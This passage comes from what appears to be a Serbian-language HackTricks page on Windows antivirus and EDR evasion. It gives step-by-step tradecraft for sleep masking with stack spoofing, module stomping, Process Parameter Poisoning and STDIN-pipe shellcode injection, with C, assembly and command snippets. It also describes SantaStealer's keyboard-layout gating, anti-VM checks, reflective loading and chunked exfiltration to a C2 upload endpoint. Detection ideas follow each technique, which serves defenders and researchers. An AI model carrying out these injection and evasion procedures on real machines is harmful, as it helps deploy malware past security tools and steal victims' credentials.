- Tokom perioda spavanja kopiraj `NT_TIB` spoof thread-a u TEB trenutnog thread-a kako bi stack walker-i radili unutar legitimnog opsega steka.
- Po završetku čekanja vrati originalni TIB i kontekst thread-a.

Ovim se čuva instrukcijski pokazivač usklađen sa CET-om, a EDR stack walker-i se dovode u zabludu ako se oslanjaju na metapodatke steka u TEB-u za proveru unwind-ova.

### Alternativa zasnovana na APC-u: Kraken Mask

Ako je timer-queue dispatch previše prepoznatljiv, isti redosled sleep-encrypt-spoof-restore može da se izvrši iz suspendovanog pomoćnog thread-a pomoću queued APC-ova:<sup>[[27]](#references)</sup>

- Kreiraj pomoćni thread sa `NtTestAlert` kao entrypoint-om.
- Queue-uj pripremljene `CONTEXT` frejmove/APC-ove pomoću `NtQueueApcThread` i obradi ih pomoću `NtAlertResumeThread`.
- Stanje lanca čuvaj na heap-u umesto na steku pomoćnog thread-a da ne bi potrošio podrazumevani stek od 64 KB.
- Koristi `NtSignalAndWaitForSingleObject` da atomski signaliziraš start event i blokiraš thread.
- Suspenduj glavni thread pre vraćanja TIB-a/konteksta (`NtSuspendThread` → vrati → `NtResumeThread`) kako bi smanjio vremenski prozor u kom bi skener mogao da uhvati napola vraćen stek.

Time se potpis `CreateTimerQueueTimer` + `NtContinue` zamenjuje potpisom helper-thread/APC, uz zadržavanje istih ciljeva RC4 maskiranja i stack spoofing-a.

Dodatne ideje za detekciju
- `NtSetInformationVirtualMemory` sa `VmCfgCallTargetInformation` neposredno pre spavanja, čekanja ili APC dispatch-a.
- `GetThreadContext`/`SetThreadContext` oko poziva `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ili `ConnectNamedPipe`.
- `NtQueryInformationThread` praćen direktnim upisima u granice steka TEB/TIB-a trenutnog thread-a.
- Lanci `NtQueueApcThread`/`NtAlertResumeThread` koji indirektno dosežu `SystemFunction032`, `VirtualProtect` ili pomoćne funkcije za vraćanje dozvola sekcija.
- Ponovljena upotreba kratkih gadget potpisa kao što su `FF 23` (`jmp [rbx]`) ili `FF E7` (`jmp rdi`) kao dispatch pivota unutar potpisanih modula.


## Precision Module Stomping

Module stomping izvršava payload iz **sekcije `.text` DLL-a koji je već mapiran unutar ciljnog procesa**, umesto da alocira očiglednu privatnu izvršnu memoriju ili učitava novi žrtveni DLL. Cilj za prepisivanje treba da bude **učitan image potkrepljen datotekom na disku**, čiji kodni prostor može da primi payload bez oštećenja putanja koda koje su procesu i dalje potrebne.<sup>[[1]](#references)[[2]](#references)</sup>

### Pouzdan izbor cilja

Naivni stomping nad uobičajenim modulima kao što su `uxtheme.dll` ili `comctl32.dll` nije pouzdan: DLL možda nije učitan u udaljenom procesu, a premali kodni region može da sruši proces. Pouzdaniji postupak je:

1. Nabroji module ciljnog procesa i zadrži **listu uključivanja koja sadrži samo imena** već učitanih DLL-ova.
2. Prvo izgradi payload i zabeleži njegovu **tačnu veličinu u bajtovima**.
3. Skeniraj DLL-ove na disku i uporedi veličinu PE sekcije **`.text` `Misc_VirtualSize`** sa veličinom payload-a. Ovo je važnije od veličine datoteke jer odražava veličinu izvršne sekcije **kada se mapira u memoriju**.
4. Parsiraj **Export Address Table (EAT)** i izaberi RVA izvezene funkcije kao početni pomeraj za stomp.
5. Izračunaj **oblast posledica**: ako payload premaši granicu izabrane funkcije, prebrisaće susedne export-e koji slede iza nje u memoriji.

Primeri pomoćnih alata za izviđanje/izbor koji se koriste u praksi:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

- Operativne napomene
- Dajte prednost DLL-ovima **koji su već učitani** u udaljenom procesu da biste izbegli telemetriju koju stvaraju `LoadLibrary`/neočekivana učitavanja image-a.
- Dajte prednost export-ima koje ciljna aplikacija retko izvršava; u suprotnom, uobičajeni tokovi koda mogu naići na izmenjene bajtove pre ili posle kreiranja niti.
- Za velike implantate često je potrebno promeniti ugrađivanje shellcode-a iz string literala u **inicijalizator niza bajtova/u vitičastim zagradama** kako bi ceo bafer bio ispravno predstavljen u izvornom kodu injector-a.

Ideje za detekciju
- Udaljeni upisi u **izvršne stranice podržane image-om** (`MEM_IMAGE`, `PAGE_EXECUTE*`) umesto u uobičajenije privatne RWX/RX alokacije.
- Ulazne tačke export-a čiji se bajtovi u memoriji više ne podudaraju sa odgovarajućim fajlom na disku.
- Udaljene niti ili preusmeravanja konteksta koje započinju izvršavanje unutar export-a legitimnog DLL-a čiji su početni bajtovi nedavno izmenjeni.
- Sumnjive sekvence `VirtualProtect(Ex)` / `WriteProcessMemory` nad DLL `.text` stranicama, nakon kojih sledi kreiranje niti.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) je tehnika **ubrizgavanja u proces / izbegavanja EDR-a** kojom se zaobilazi klasični put udaljenog upisa (`VirtualAllocEx` + `WriteProcessMemory`). Umesto kopiranja bajtova u već pokrenuti ciljni proces, ona zloupotrebljava činjenicu da Windows **kopira odabrane početne parametre funkcije `CreateProcessW` u child proces** i čuva ih unutar `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Prenosnici podložni trovanju koje kopira `CreateProcessW`

Korisni prenosnici su:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (sa `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktična ograničenja prenosnika:

- `lpCommandLine` mora da pokazuje na **memoriju u koju može da se upisuje** za `CreateProcessW`, a ograničen je na **32,767 Unicode znakova**, uključujući završni null terminator.
- `lpEnvironment` mora biti Unicode blok okruženja sa uzastopnim nizovima `NAME=VALUE\0`, završen dodatnim `\0`.
- `lpReserved` je zvanično rezervisan, pa mapiranje na `ShellInfo` treba smatrati detaljem implementacije, a ne stabilnim, dokumentovanim ugovorom.

Time se uobičajeno kreiranje procesa pretvara u **primitivu za prenos payload-a**. Operator kreira child proces sa početnim podacima pod kontrolom napadača i prepušta Windows-u da obavi kopiranje između procesa.

### Tok udaljenog pronalaženja bez API-ja za udaljeni upis

Nakon kreiranja child procesa, pronađite kopirani bafer pomoću primitiva **samo za čitanje**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → dobijte `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Pročitajte udaljeni `PEB`
3. Pratite `PEB.ProcessParameters`
4. Pročitajte `RTL_USER_PROCESS_PARAMETERS`
5. Koristite izabrani pokazivač:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalni tok:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Izvršavanje kopiranog bafera parametara

Kopirani region parametara je obično `RW`, a ne izvršni. Uobičajeni P3 lanac je:

1. Kreirati proces na uobičajen način (ne suspendovan)
2. Učiniti izabranu stranicu parametara izvršnom pomoću `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponovo upotrebiti handle glavne niti koji je već vraćen u `PROCESS_INFORMATION`
4. Preusmeriti izvršavanje pomoću `NtSetContextThread` (`CONTEXT_CONTROL`, prepisati `RIP`)

Za razliku od klasičnih tokova rada za preotimanje niti, za ovo **nije potrebno** koristiti `SuspendThread` / `ResumeThread`; kontekst se može promeniti direktno preko vraćenog handle-a glavne niti.

Tako se izbegava nekoliko API-ja koji se često nadziru zbog ubacivanja koda:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- često и `SuspendThread` / `ResumeThread`

### Ограничење нултих бајтова и staged shellcode

Сва три носача су **стринг или подаци налик стрингу**, па се сирови payload који садржи `0x00` скраћује током преноса. Практично решење је **прва фаза без нултих бајтова** која реконструише константе током извршавања, а затим учитава произвољну другу фазу.

Једноставан образац је синтеза константи заснована на XOR-у:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Ovo omogućava prvoj fazi da napravi stringove na steku, argumente API-ja, putanje do DLL-ova ili loader shellcode-a druge faze, bez ugrađivanja null bajtova u preneti parametar.

### API pozivi zasnovani na steku iz prve faze

Kada prva faza mora da pozove API-je kao što je `LoadLibraryA`, može da:

- postavi string/bufer na stek ciljnog procesa
- rezerviše **32-byte x64 shadow space**
- postavi `RCX`, `RDX`, `R8`, `R9` na konstante ili pokazivače relativne u odnosu na `RSP`
- zadrži **poravnanje `RSP` na 16 bajtova** pre poziva

Zatim se druga faza može kopirati sa steka u alokaciju `PAGE_READWRITE`, promeniti joj se zaštita u `PAGE_EXECUTE_READ` pomoću `VirtualProtect`, pa se na nju može skočiti, čime se izbegava direktna RWX alokacija.

### Ideje za detekciju

Autori navode sledeće dobre prilike za lov na pretnje:

- `VirtualProtectEx` / `NtProtectVirtualMemory` koji menjaju **stranice parametara procesa tako da budu izvršive**
- ta promena zaštite praćena pozivom `SetThreadContext` / `NtSetContextThread`
- udaljena čitanja `PEB`-a, a zatim `RTL_USER_PROCESS_PARAMETERS`
- neuobičajeno duge vrednosti ili vrednosti sa visokom entropijom u `lpCommandLine`, `lpEnvironment` ili `STARTUPINFO.lpReserved` prilikom kreiranja procesa

### Napomene

- P3 je **trik za prenos između procesa**, a ne samostalna primitiva za izvršavanje: kopiranom parametru je i dalje potrebno promeniti dozvole tako da bude izvršiv i primeniti metod za preusmeravanje izvršavanja.
- Autori su razmatrali `RtlCreateProcessReflection` / Dirty Vanity, ali su ga odbacili jer interno dolazi do sumnjivih primitva kao što su `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## Ubacivanje kroz konzolni STDIN pipe

Interaktivni konzolni child proces može da posluži i kao **primitiva za prenos payload-a**. Injector preusmerava standardni ulaz child procesa na pipe i šalje marker praćen shellcode-om. Nakon što konzolni program pročita podatke u sopstvenu privatnu memoriju, injector pronalazi taj bafer, čini ga izvršivim i preusmerava nit child procesa na njega. Time se izbegavaju `VirtualAllocEx` i `WriteProcessMemory`, ali je ovo i dalje process injection, a ne opšti EDR bypass.<sup>[[41]](#references)</sup>

Uprkos opisu „named-pipe“, referentna implementacija poziva `CreatePipe`, koji kreira **anonimni pipe**. Windows interno implementira anonimne pipe-ove pomoću objekata pipe-a sa jedinstvenim imenima, ali PoC ne bira putanju `\\.\pipe\<name>` niti poziva `CreateNamedPipe`. Kreira nasleđujuće handle-ove sa podrazumevanim deskriptorom bezbednosti, postavlja handle za čitanje u `STARTUPINFO.hStdInput`, postavlja `STARTF_USESTDHANDLES` i pokreće novi child proces uz omogućeno nasleđivanje handle-ova. Dakle, ovaj PoC pokreće prosleđeni konzolni izvršni fajl; ne povezuje svoj pipe sa postojećim procesom.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referentni tok rada

Implementacija koristi sledeći niz koraka:<sup>[[41]](#references)</sup>

1. Kreira parove anonimnih pipe-ova za `STDIN` i `STDOUT` child procesa. Isključuje nasleđivanje za dva handle-a na strani roditeljskog procesa, a nakon kreiranja procesa zatvara дубликате handle-ова на страни child процеса у родитељском процесу.
2. Покреће интерактивни извршни фајл као што је `netsh.exe` или `nslookup.exe` са `CREATE_NEW_CONSOLE`. Child процес наслеђује преусмерене стандардне handle-ове.
3. Шаље комплетан бинарни низ `rawData` помоћу `WriteFile` кроз handle за `STDIN` на страни родитељског процеса. Конзолни програм преузима бајтове и оставља копију у једној од својих приватних commit-ованих области.
4. Претражује адресни простор child процеса помоћу `VirtualQueryEx`, чита потенцијалне `MEM_PRIVATE` области помоћу `ReadProcessMemory` и тражи marker на почетку `rawData`.
5. Мења заштиту пронађеног бафера у `PAGE_EXECUTE_READWRITE` помоћу `VirtualProtectEx`.
6. Идентификује главну нит, суспендује је, поставља `RIP` на `found_address + 0x19` помоћу `NtSetContextThread`, па је наставља.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Dostavljena implementacija je specifična za x64: menja `CONTEXT.Rip`, a ugrađeni payload je x64 shellcode. `rawData` počinje markerom od 25 bajtova, pa izvršni bajtovi počinju na heksadecimalnom pomeraju `0x19`. Prilikom zamene payloada sačuvajte taj raspored ili istovremeno ažurirajte marker, vektor pretrage, veličinu niza i pomeraj izvršavanja. U komentarima izvornog koda navedeni su i `0x0A`, `0x0D` i `0x1A` kao nedozvoljeni znakovi. Ovaj postupak ne menja token ni privilegije child procesa.<sup>[[41]](#references)</sup>

Za male izvorne pomoćne programe i obrasce kompajliranja payloada pogledajte [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## SantaStealer taktike za izbegavanje detekcije bez datoteka i krađu akreditiva

SantaStealer (poznat i kao BluelineStealer) pokazuje kako savremeni infostealeri objedinjuju AV bypass, anti-analizu i pristup akreditivima u jednom toku rada.<sup>[[24]](#references)</sup>

### Ograničavanje prema rasporedu tastature i odlaganje u sandboxu

- Konfiguraciona zastavica (`anti_cis`) nabraja instalirane rasporede tastature pomoću funkcije `GetKeyboardLayoutList`. Ako se pronađe ćirilični raspored, uzorak kreira prazan marker `CIS` i prekida rad pre pokretanja stealera, čime osigurava da se nikada ne aktivira u isključenim regionima, a pritom ostavlja trag za lov na pretnje.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Slojevita logika `check_antivm`

- Varijanta A prolazi kroz listu procesa, hešira svaki naziv prilagođenom rotirajućom kontrolnom sumom i poredi ga sa ugrađenim listama blokiranih naziva za debuggere/sandbox okruženja; ponavlja kontrolnu sumu nad nazivom računara i proverava radne direktorijume kao što je `C:\analysis`.
- Varijanta B proverava sistemska svojstva (minimalan broj procesa, nedavno vreme pokretanja), poziva `OpenServiceA("VBoxGuest")` radi otkrivanja VirtualBox additions i proverava vreme oko pauza kako bi uočila single-stepping. Svako poklapanje prekida izvršavanje pre pokretanja modula.

### Fileless pomoćni program + dvostruko ChaCha20 reflective loading

- Primarni DLL/EXE sadrži Chromium credential helper koji se ili upisuje na disk ili se ručno mapira u memoriju; u fileless režimu sam razrešava importe/relokacije, tako da se ne zapisuju nikakvi fajlovi pomoćnog programa.
- Taj helper čuva DLL druge faze, dvostruko šifrovan pomoću ChaCha20 (dva 32-bajtna ključa + 12-bajtni nonce). Nakon oba prolaza, blob se učitava putem reflective loading-a (bez `LoadLibrary`), a zatim se pozivaju exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, izvedeni iz [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Rutine ChromElevator koriste reflective process hollowing putem direct-syscall tehnike za ubacivanje koda u aktivan Chromium pregledač, nasleđuju AppBound Encryption ključeve i dešifruju lozinke/cookies/kreditne kartice direktno iz SQLite baza podataka, uprkos ABE zaštiti.


### Modularno prikupljanje u memoriji i HTTP eksfiltracija u delovima

- `create_memory_based_log` prolazi kroz globalnu tabelu pokazivača funkcija `memory_generators` i pokreće po jednu nit za svaki omogućen modul (Telegram, Discord, Steam, snimci ekrana, dokumenti, ekstenzije pregledača itd.). Svaka nit upisuje rezultate u zajedničke bafere i prijavljuje broj fajlova nakon približno 45 sekundi čekanja na niti.
- Po završetku, sve se arhivira pomoću statički povezane biblioteke `miniz` kao `%TEMP%\\Log.zip`. Zatim `ThreadPayload1` čeka 15 sekundi i šalje arhivu HTTP POST zahtevom, u delовима od 10 MB, na `http://<C2>:6767/upload`, имитирајући прегледачки `multipart/form-data` boundary (`----WebKitFormBoundary***`). Сваки део додаје `User-Agent: upload`, `auth: <build_id>`, опционално `w: <campaign_tag>`, а последњи део додаје `complete: true` како би C2 знао да је поновно састављање завршено.

## References

- [1] [Napredne tehnike izbegavanja: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Pozivni stekovi: nema više besplatnih prolaza za malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentacija](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – primer](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – primer](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC za lažiranje pozivnog steka](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Novi lanac infekcije i obfuskacija zasnovana na ConfuserEx-u za DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Treba li verovati svom zero trust-u? Zaobilaženje Zscaler provera bezbednosnog stanja](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Pre ToolShell-a: Istraživanje prethodnih ransomware operacija grupe Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: zloupotreba prosleđenih exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventar prosleđenih exports u Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Redosled pretrage dinamički povezanih biblioteka](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Bezbednost procesa i prava pristupa](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU referenca (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Pokretač CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Suprotstavljanje EDR-ovima uz zaštitu koju pruža Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Probijanje zaštitnog omotača Windows Defender-a tehnikom Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenca za komandu mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Iza čiste zavese: od RAT-a preko builder-a do programera](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer stiže u grad: novi, ambiciozni infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Dešifrovanje Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: otkrivanje Node.js malware-a pomoću API tracing-a](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Uspavana lepotica: stavljanje Adaptix-a na počinak pomoću Crystal Palace-a](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Trovanje parametara procesa](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Uspavana lepotica II: CFG, CET i lažiranje steka](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Sakrivanje .NET ETW-a](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Zloupotreba Chrome Remote Desktop-a u Red Team operacijama: praktični vodič](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: pretvaranje Defender-ovog remediation driver-a u kernel operativni primitiv](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Prateći kod za MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: pravljenje funkcija koje same sebe maskiraju pomoću LLVM-a](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - Izvorni kod InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Funkcija CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Kreiranje podređenog procesa sa preusmerenim ulazom i izlazom](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: ponovno kovanje C# alata pomoću WasmForge-a](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Kompajliranje C# / .NET projekata](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
{{#include ../banners/hacktricks-training.md}}
